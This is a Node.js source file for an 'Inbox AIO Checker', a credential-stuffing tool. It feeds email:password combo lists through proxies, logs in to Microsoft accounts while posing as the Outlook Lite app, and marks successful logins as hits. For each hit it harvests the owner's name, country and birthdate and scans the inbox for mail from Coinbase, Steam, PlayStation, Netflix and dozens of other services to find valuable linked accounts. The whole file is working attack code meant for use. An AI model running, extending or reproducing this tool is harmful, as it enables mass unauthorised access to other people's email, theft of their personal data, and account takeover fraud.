// ============================================================
//  Microsoft Inbox AIO Checker — Node.js port of new_2.py (OutlookChecker)
//  IDP check → OAuth authorize → Login → Token → Profile → Inbox scan
//  Services matched by sender email address in bulk message data
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { randomUUID } = require("crypto");

// ── Service definitions (exact match of Python default_services) ──
const SERVICES = {
  "noreply@microsoft.com": "Microsoft",
  "no_reply@email.apple.com": "Apple",
  "noreply@email.apple.com": "Apple2",
  "no-reply@icloud.com": "iCloud",
  "Azure-noreply@microsoft.com": "Azure",
  "noreply@mail.accounts.riotgames.com": "Riot",
  "konami-info@konami.net": "Konami",
  "noreply@id.supercell.com": "Supercell",
  "newsletter@service.tiktok.com": "TikTok",
  "no-reply@mail.instagram.com": "Instagram",
  "mail.instagram.com": "Instagram",
  "notifications-noreply@linkedin.com": "LinkedIn",
  "fortnite@epicgames.com": "Fortnite",
  "reply@txn-email.playstation.com": "PlayStation",
  "no-reply@coinbase.com": "Coinbase",
  "noreply@steampowered.com": "Steam",
  "info@account.netflix.com": "Netflix",
  "noreply@pubgmobile.com": "PUBG",
  "security@facebookmail.com": "Facebook",
  "callofduty@comms.activision.com": "COD",
  "notification@facebookmail.com": "Facebook",
  "no-reply@spotify.com": "Spotify",
  "no_reply@snapchat.com": "Snapchat",
  "hello@mail.crunchyroll.com": "Crunchyroll",
  "no-reply@accounts.google.com": "Google",
  "account-update@amazon.com": "Amazon",
  "no-reply@epicgames.com": "Epic",
  "notifications@twitter.com": "Twitter",
  "noreply@twitch.tv": "Twitch",
  "email@discord.com": "Discord",
  "info@trendyolmail.com": "Trendyol",
  "noreply@zara.com": "Zara",
  "no-reply@itemsatis.com": "itemsatis",
  "noreply@hesap.com.tr": "hesapcomtr",
  "noreply@roblox.com": "Roblox",
  "noreply@ea.com": "EA",
  "account@nintendo.com": "Nintendo",
  "noreply@tlauncher.org": "TLauncher",
  "no-reply@pokemon.com": "Pokemon",
  "noreply@pokemon.com": "Pokemon",
  "no-reply@soundcloud.com": "SoundCloud",
  "noreply@dazn.com": "DAZN",
  "disneyplus@mail.disneyplus.com": "DisneyPlus",
  "no-reply@disneyplus.com": "DisneyPlus",
  "alerts@pornhub.com": "Pornhub",
  "noreply@pornhub.com": "Pornhub",
  "noreply@pandabuy.com": "PandaBuy",
  "no-reply@pandabuy.com": "PandaBuy",
  "noreply@minecraft.net": "Minecraft",
  "noreply@mojang.com": "Minecraft",
  "ebay@ebay.com": "eBay",
  "noreply@ebay.com": "eBay",
  "starplus@mail.starplus.com": "StarPlus",
  "no-reply@starplus.com": "StarPlus",
  "noreply@eldorado.gg": "Eldorado.gg",
  "no-reply@eldorado.gg": "Eldorado.gg",
  "support@eldorado.gg": "Eldorado.gg",
  "info@eldorado.gg": "Eldorado.gg",
  "notifications@eldorado.gg": "Eldorado.gg",
  "hello@eldorado.gg": "Eldorado.gg",
  "orders@eldorado.gg": "Eldorado.gg",
  "mail@eldorado.gg": "Eldorado.gg",
  "eldorado.gg": "Eldorado.gg",
};

const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;

// ── Helpers ──────────────────────────────────────────────────

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

function parseCountryFromJson(data) {
  try {
    if (!data || typeof data !== "object") return "";
    if (Array.isArray(data.accounts)) {
      for (const acc of data.accounts) {
        if (acc && acc.location) return String(acc.location).trim();
      }
    }
    if (data.location) {
      if (typeof data.location === "string") {
        const parts = data.location.split(",").map(p => p.trim());
        return parts[parts.length - 1] || "";
      }
      if (typeof data.location === "object") {
        for (const key of ["country", "countryOrRegion", "countryCode", "Country"]) {
          if (data.location[key]) return String(data.location[key]);
        }
      }
    }
    for (const key of ["country", "countryOrRegion", "countryCode", "Country", "homeLocation"]) {
      if (data[key]) {
        if (typeof data[key] === "string") return data[key];
        if (typeof data[key] === "object" && data[key].country) return String(data[key].country);
      }
    }
  } catch {}
  return "";
}

function parseNameFromJson(data) {
  try {
    if (!data || typeof data !== "object") return "";
    if (data.displayName) return String(data.displayName);
    for (const key of ["name", "givenName", "fullName", "DisplayName"]) {
      if (data[key]) return String(data[key]);
    }
  } catch {}
  return "";
}

function extractSubjectsFromJson(jsonText) {
  const subjects = [];
  try {
    const data = JSON.parse(jsonText);
    if (data && data.value && Array.isArray(data.value)) {
      for (const msg of data.value) {
        if (msg && msg.subject && typeof msg.subject === "string") {
          subjects.push(msg.subject.trim());
        }
      }
    }
    // Recursive search for Subject/subject
    function findSubjects(obj) {
      if (!obj || typeof obj !== "object") return;
      if (Array.isArray(obj)) {
        for (const item of obj) findSubjects(item);
      } else {
        if (obj.Subject) subjects.push(String(obj.Subject).trim());
        else if (obj.subject && typeof obj.subject === "string") subjects.push(obj.subject.trim());
        for (const v of Object.values(obj)) findSubjects(v);
      }
    }
    if (!data?.value) findSubjects(data);
  } catch {}
  return subjects;
}

function countServiceMessagesWithSubjects(allMessagesText, allMessagesJsonList, services) {
  const foundServices = {};
  const allLower = allMessagesText.toLowerCase();

  // Group email patterns by service name
  const servicePatterns = {};
  for (const [email, name] of Object.entries(services)) {
    if (!servicePatterns[name]) servicePatterns[name] = [];
    servicePatterns[name].push(email.toLowerCase());
  }

  for (const [serviceName, emailPatterns] of Object.entries(servicePatterns)) {
    let maxCount = 0;
    const serviceSubjects = [];

    for (const emailPattern of emailPatterns) {
      const count = (allLower.split(emailPattern).length - 1);
      const domain = emailPattern.includes("@") ? emailPattern.split("@")[1] : emailPattern;
      const domainCount = (allLower.split(domain).length - 1);

      if (domainCount > maxCount) maxCount = domainCount;
      if (count > maxCount) maxCount = count;

      // Collect subjects
      for (const jsonText of allMessagesJsonList) {
        if (jsonText.toLowerCase().includes(emailPattern) || jsonText.toLowerCase().includes(domain)) {
          serviceSubjects.push(...extractSubjectsFromJson(jsonText));
        }
      }
    }

    if (maxCount > 0) {
      // Dedupe subjects
      const seen = new Set();
      const unique = [];
      for (const s of serviceSubjects) {
        if (s && !seen.has(s)) { seen.add(s); unique.push(s); }
      }
      foundServices[serviceName] = {
        count: maxCount,
        subjects: unique.slice(0, 10),
      };
    }
  }

  return foundServices;
}

// ── Cookie jar ──────────────────────────────────────────────

function createCookieJar() {
  const jar = new Map();
  return {
    set(name, value) { jar.set(name, value); },
    get(name) { return jar.get(name); },
    toString() { return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; "); },
    getDict() { return Object.fromEntries(jar); },
    parseFromHeaders(headers) {
      const setCookie = headers.getSetCookie?.() || [];
      for (const c of setCookie) {
        const parts = c.split(";")[0].split("=");
        if (parts.length >= 2) {
          jar.set(parts[0].trim(), parts.slice(1).join("=").trim());
        }
      }
    },
  };
}

// ── Session fetch with manual redirects + cookie persistence ──

async function sessionFetch(url, options, cookieJar, maxRedirects = 10) {
  let currentUrl = url;
  for (let i = 0; i < maxRedirects; i++) {
    const resp = await proxiedFetch(currentUrl, {
      ...options,
      redirect: "manual",
      headers: {
        ...(options.headers || {}),
        Cookie: cookieJar.toString(),
      },
    });
    cookieJar.parseFromHeaders(resp.headers);

    const status = resp.status;
    if (status >= 300 && status < 400) {
      const location = resp.headers.get("location");
      if (!location) break;
      currentUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
      options = { ...options, method: "GET", body: undefined };
      continue;
    }
    resp._finalUrl = currentUrl;
    return resp;
  }
  const finalResp = await proxiedFetch(currentUrl, {
    ...options, method: "GET", body: undefined, redirect: "manual",
    headers: { ...(options.headers || {}), Cookie: cookieJar.toString() },
  });
  cookieJar.parseFromHeaders(finalResp.headers);
  finalResp._finalUrl = currentUrl;
  return finalResp;
}

// ── Single account check (1:1 port of OutlookChecker.check) ──

async function attemptCheck(email, password) {
  const result = {
    user: email,
    password,
    status: "fail",
    captures: {},
    services: {},
    detail: "",
    country: "",
    name: "",
    birthdate: "",
  };

  const cookieJar = createCookieJar();
  const uid = randomUUID();

  try {
    // ── Step 1: IDP check ──
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpResp = await proxiedFetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": uid,
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
      },
      signal: AbortSignal.timeout(15000),
    });
    const idpText = await idpResp.text();

    if (["Neither", "Both", "Placeholder", "OrgId"].some(x => idpText.includes(x))) {
      result.detail = "IDP check failed";
      return result;
    }
    if (!idpText.includes("MSAccount")) {
      result.detail = "not MSAccount";
      return result;
    }

    // ── Step 2: OAuth authorize (get PPFT + urlPost dynamically) ──
    await delay(500);

    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;

    const authResp = await sessionFetch(authUrl, {
      method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
      },
      signal: AbortSignal.timeout(15000),
    }, cookieJar);

    const authBody = await authResp.text();

    const urlMatch = authBody.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authBody.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);

    if (!urlMatch || !ppftMatch) {
      // Try alternate patterns
      const urlMatch2 = authBody.match(/urlPost:'([^']+)'/);
      const ppftMatch2 = authBody.match(/name="PPFT"[^>]*value="([^"]+)"/);
      if (!urlMatch2 && !urlMatch || !ppftMatch2 && !ppftMatch) {
        result.detail = "PPFT/urlPost not found";
        return result;
      }
    }

    const postUrl = (urlMatch ? urlMatch[1] : authBody.match(/urlPost:'([^']+)'/)?.[1] || "").replace(/\\\//g, "/");
    const ppft = ppftMatch ? ppftMatch[1] : (authBody.match(/name="PPFT"[^>]*value="([^"]+)"/)?.[1] || "");

    if (!postUrl || !ppft) {
      result.detail = "PPFT/urlPost extraction failed";
      return result;
    }

    // ── Step 3: Login POST (allow_redirects=False equivalent) ──
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;

    const loginResp = await proxiedFetch(postUrl, {
      method: "POST",
      body: loginData,
      redirect: "manual",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Referer": authResp._finalUrl || authUrl,
        Cookie: cookieJar.toString(),
      },
      signal: AbortSignal.timeout(15000),
    });

    cookieJar.parseFromHeaders(loginResp.headers);
    const loginBody = await loginResp.text();

    if (loginBody.includes("account or password is incorrect") || (loginBody.match(/error/g) || []).length > 0) {
      result.detail = "bad credentials";
      return result;
    }
    if (loginBody.includes("https://account.live.com/identity/confirm")) {
      result.detail = "identity confirm";
      return result;
    }
    if (loginBody.includes("https://account.live.com/Abuse")) {
      result.detail = "abuse/locked";
      return result;
    }

    const location = loginResp.headers.get("location") || "";
    if (!location) {
      result.detail = "no redirect location";
      return result;
    }

    const codeMatch = location.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.detail = "auth code not found";
      return result;
    }
    const authCode = codeMatch[1];

    // Get CID from cookies
    const mspcid = cookieJar.get("MSPCID") || "";
    if (!mspcid) {
      result.detail = "CID not found";
      return result;
    }
    const cid = mspcid.toUpperCase();

    // ── Step 4: Exchange code for token ──
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${encodeURIComponent(authCode)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;

    const tokenResp = await proxiedFetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      body: tokenData,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: cookieJar.toString(),
      },
      signal: AbortSignal.timeout(15000),
    });
    const tokenText = await tokenResp.text();

    if (!tokenText.includes("access_token")) {
      result.detail = "token exchange failed";
      return result;
    }

    let tokenJson;
    try { tokenJson = JSON.parse(tokenText); } catch { result.detail = "token parse failed"; return result; }
    const accessToken = tokenJson.access_token;
    if (!accessToken) { result.detail = "no access_token"; return result; }

    result.status = "hit";

    // ── Step 5: Profile information ──
    const profileHeaders = {
      "User-Agent": "Outlook-Android/2.0",
      "Authorization": `Bearer ${accessToken}`,
      "X-AnchorMailbox": `CID:${cid}`,
    };

    let country = "";
    let name = "";
    let birthdate = "";

    // 5a: V1Profile
    try {
      const profResp = await proxiedFetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
        headers: profileHeaders,
        signal: AbortSignal.timeout(15000),
      });
      if (profResp.ok) {
        const profile = await profResp.json();
        country = parseCountryFromJson(profile);
        name = parseNameFromJson(profile);
        const bd = profile.birthDay, bm = profile.birthMonth, by = profile.birthYear;
        if (bd) birthdate = `${bd}-${bm}-${by}`;
      }
    } catch {}

    // 5b: Graph API fallback for country/name
    if (!country) {
      try {
        const graphResp = await proxiedFetch("https://graph.microsoft.com/v1.0/me", {
          headers: profileHeaders,
          signal: AbortSignal.timeout(15000),
        });
        if (graphResp.ok) {
          const graphData = await graphResp.json();
          if (!country) country = parseCountryFromJson(graphData);
          if (!name) name = parseNameFromJson(graphData);
        }
      } catch {}
    }

    result.country = country;
    result.name = name;
    result.birthdate = birthdate;

    // ── Step 6: Inbox data — Multiple sources ──
    let allMessagesText = "";
    const allMessagesJson = [];

    // 6a: StartupData
    try {
      const startupHeaders = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": randomUUID(),
        "x-req-source": "Mini",
        "authorization": `Bearer ${accessToken}`,
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
        "action": "StartupData",
        "x-owa-correlationid": randomUUID(),
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
      };

      const startupResp = await proxiedFetch(
        `https://outlook.live.com/owa/${encodeURIComponent(email)}/startupdata.ashx?app=Mini&n=0`,
        {
          method: "POST",
          body: "",
          headers: startupHeaders,
          signal: AbortSignal.timeout(30000),
        }
      );
      if (startupResp.ok) {
        const text = await startupResp.text();
        allMessagesText += text.toLowerCase() + " ";
        allMessagesJson.push(text);
      }
    } catch {}

    // 6b: Graph API Messages
    try {
      const graphMsgResp = await proxiedFetch(
        "https://graph.microsoft.com/v1.0/me/messages?$top=200&$select=from,subject",
        {
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          signal: AbortSignal.timeout(30000),
        }
      );
      if (graphMsgResp.ok) {
        const text = await graphMsgResp.text();
        allMessagesText += text.toLowerCase() + " ";
        allMessagesJson.push(text);
      }
    } catch {}

    // 6c: Office365 API Messages
    try {
      const officeResp = await proxiedFetch(
        "https://outlook.office.com/api/v2.0/me/messages?$top=200&$select=From,Subject",
        {
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "Accept": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "X-AnchorMailbox": `CID:${cid}`,
          },
          signal: AbortSignal.timeout(30000),
        }
      );
      if (officeResp.ok) {
        const text = await officeResp.text();
        allMessagesText += text.toLowerCase() + " ";
        allMessagesJson.push(text);
      }
    } catch {}

    // ── Step 7: Count services ──
    const foundServices = countServiceMessagesWithSubjects(allMessagesText, allMessagesJson, SERVICES);
    result.services = foundServices;

    if (Object.keys(foundServices).length === 0) {
      result.status = "fail";
      result.detail = "no services found";
    }

  } catch (err) {
    if (err.name === "TimeoutError" || err.message?.includes("timed out")) {
      result.status = "retry";
      result.detail = "timed out";
    } else if (err.message?.includes("fetch failed") || err.message?.includes("ECONNREFUSED")) {
      result.status = "retry";
      result.detail = "connection error";
    } else {
      result.status = "fail";
      result.detail = String(err).slice(0, 100);
    }
  }

  return result;
}

// ── Single account with retries ──

async function checkSingleAccount(email, password) {
  let result;
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    result = await attemptCheck(email, password);
    if (result.status === "retry") {
      if (attempt < MAX_RETRIES - 1) {
        await delay(RETRY_DELAY * (attempt + 1));
        continue;
      }
      result.status = "fail";
      result.detail = `retry exhausted (${result.detail})`;
    }
    return result;
  }
  return result;
}

// ── Batch checker ───────────────────────────────────────────

async function checkInboxAccounts(accounts, threads = 5, onProgress, signal) {
  const results = [];
  let currentIndex = 0;
  let completed = 0;
  let hitCount = 0;
  let failCount = 0;

  async function worker() {
    while (true) {
      if (signal?.aborted) break;
      const idx = currentIndex++;
      if (idx >= accounts.length) break;

      const combo = accounts[idx];
      const parts = combo.split(":");
      if (parts.length < 2 || !parts[0].trim() || !parts[1].trim()) {
        results.push({
          user: parts[0]?.trim() || combo,
          password: parts[1]?.trim() || "",
          status: "fail",
          captures: {},
          services: {},
          detail: "invalid format",
          country: "",
          name: "",
          birthdate: "",
        });
        completed++;
        continue;
      }

      const email = parts[0].trim();
      const pw = parts.slice(1).join(":").trim();
      const r = await checkSingleAccount(email, pw);
      results.push(r);
      completed++;

      if (r.status === "hit") hitCount++;
      else failCount++;

      if (onProgress) {
        try {
          onProgress(completed, accounts.length, r.status, hitCount, failCount, r);
        } catch {
          try { onProgress(completed, accounts.length); } catch {}
        }
      }
    }
  }

  const concurrency = Math.min(threads, 50);
  const workers = Array(Math.min(concurrency, accounts.length)).fill(null).map(() => worker());
  await Promise.all(workers);
  return results;
}

function getServiceList() {
  return Object.entries(SERVICES).map(([email, name]) => ({ email, name }));
}

function getServiceCount() {
  return new Set(Object.values(SERVICES)).size;
}

module.exports = { checkInboxAccounts, getServiceList, getServiceCount, SERVICES };
